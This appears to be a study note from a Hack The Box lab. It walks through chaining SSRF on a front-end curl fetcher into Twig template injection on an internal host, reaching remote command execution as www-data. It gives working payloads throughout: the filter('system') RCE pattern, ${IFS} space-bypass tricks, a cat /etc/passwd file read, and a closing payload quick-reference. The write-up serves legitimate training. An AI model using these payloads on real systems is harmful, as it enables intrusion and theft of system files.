---
tags: [htb, ssrf, ssti, rce, twig, web]
assessment: HTB SSRF Final Assessment
target: 154.57.164.73
created: 2026-11-05
---

# SSRF → SSTI → RCE (TruckAPI)

> [!summary] The chain in one line
> A front-end app fetches a user-supplied URL with **curl** (SSRF). That URL points at an internal service (`truckapi.htb`) that renders the query string through **Twig** (SSTI). Chaining them gives **remote code execution** on the internal host.

---

## 1. Finding the injection point

The front-end exposes a POST request whose `api` parameter takes a **full URL** and fetches it server-side. That's the SSRF primitive — the server makes the request, not the browser.

```http
POST / HTTP/1.1
Host: 154.57.164.73:36978
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

api=http://truckapi.htb/?id={{7*7}}
```

The `api=` value is a URL, and we control a query parameter (`id`) on the **internal** target. Whatever we put there is reflected into that internal service's response.

> [!note] Why `truckapi.htb`?
> It's an internal-only hostname the front-end can resolve but you can't reach directly. The SSRF is what lets you talk to it at all — that's the whole point of the SSRF stage.

---

## 2. Confirming the SSTI

Classic template-engine probe — inject a math expression and see if it gets evaluated:

```
{{7*7}}
```

If the response contains `49` instead of the literal `{{7*7}}`, the parameter is being rendered by a template engine. Here it came back evaluated → **Twig** (PHP) confirmed.

> [!tip] Fingerprinting the engine
> `{{7*7}}` = `49` → Jinja2 **or** Twig.
> `{{7*'7'}}` = `49` → Twig (PHP coerces the string). `7777777` → Jinja2.
> The payloads below are Twig-specific.

---

## 3. Escalating to RCE

Twig doesn't expose `system()` directly, but the `filter` function lets you map an array through an arbitrary PHP callable. Point it at `system`:

```
api=http://truckapi.htb/?id={{['id']|filter('system')}}
```

**Response:**

```json
{"id": "uid=33(www-data) gid=33(www-data) groups=33(www-data)\nArray", "location": "134 Main Street"}
```

Command execution as `www-data`. ✅

> [!info] What's the stray `Array`?
> `filter('system')` runs `system()` over each array element. `system()` prints its output directly *and* returns the last line, so you see the command output followed by Twig stringifying the returned array as `Array`. Cosmetic — ignore it.

---

## 4. Reading files — the space problem

Natural next step:

```
{{['cat /etc/passwd']|filter('system')}}
```

But this **fails** with:

```
Error (3): URL using bad/illegal format or missing URL
```

> [!warning] Root cause
> Error 3 is curl's `CURLE_URL_MALFORMAT`. The front-end hands the `api` value straight to **curl**, and curl refuses any URL containing a **raw space**. The space in `cat /etc/passwd` kills the request *before* it ever reaches truckapi.htb.

### Why URL-encoding doesn't save you

The front-end reads `api` via something that **auto-decodes** it (e.g. PHP `$_GET`). So `%20` is turned back into a literal space before curl runs → same error. You need a payload with **no space in it at all**.

### The fix: `${IFS}`

Let the shell rebuild the space instead of putting one in the URL. `$IFS` (Internal Field Separator) defaults to space/tab/newline:

```
api=http://truckapi.htb/?id={{['cat${IFS}/etc/passwd']|filter('system')}}
```

**Why it works end-to-end:**
- No raw space → curl accepts the URL → SSRF fires.
- Single quotes in Twig don't interpolate `${...}`, so the literal `cat${IFS}/etc/passwd` reaches PHP intact.
- `system()` runs it via `/bin/sh`, which expands `$IFS` back into a real space → `cat /etc/passwd`.

> [!tip] Backup no-space tricks
> If `${IFS}` gets mangled, use `$IFS$9` → `cat$IFS$9/etc/passwd`. Other separators: brace expansion, tabs, or `<` redirection depending on the command.

---

## Key takeaways

- [ ] **SSRF + SSTI stack.** The `api=URL` param is SSRF; the rendered query string on the internal host is SSTI. Neither alone gets you there — the chain does.
- [ ] **Confirm before escalating.** `{{7*7}}` → `49` proves injection cheaply before you throw RCE payloads.
- [ ] **Twig RCE pattern:** `{{['CMD']|filter('system')}}`.
- [ ] **Mind the transport layer.** A payload can be perfectly valid Twig and still fail because **curl** (the SSRF fetcher) rejects it first. "Bad/illegal format" = curl, not the template engine.
- [ ] **Spaces are the enemy.** `%20` gets decoded away; use `${IFS}` / `$IFS$9` instead.

## Payload quick-reference

```
# Confirm SSTI
api=http://truckapi.htb/?id={{7*7}}

# RCE
api=http://truckapi.htb/?id={{['id']|filter('system')}}

# Read a file (space-safe)
api=http://truckapi.htb/?id={{['cat${IFS}/etc/passwd']|filter('system')}}

# Useful follow-ups
api=http://truckapi.htb/?id={{['ls${IFS}-la${IFS}/']|filter('system')}}
api=http://truckapi.htb/?id={{['id;hostname']|filter('system')}}
```
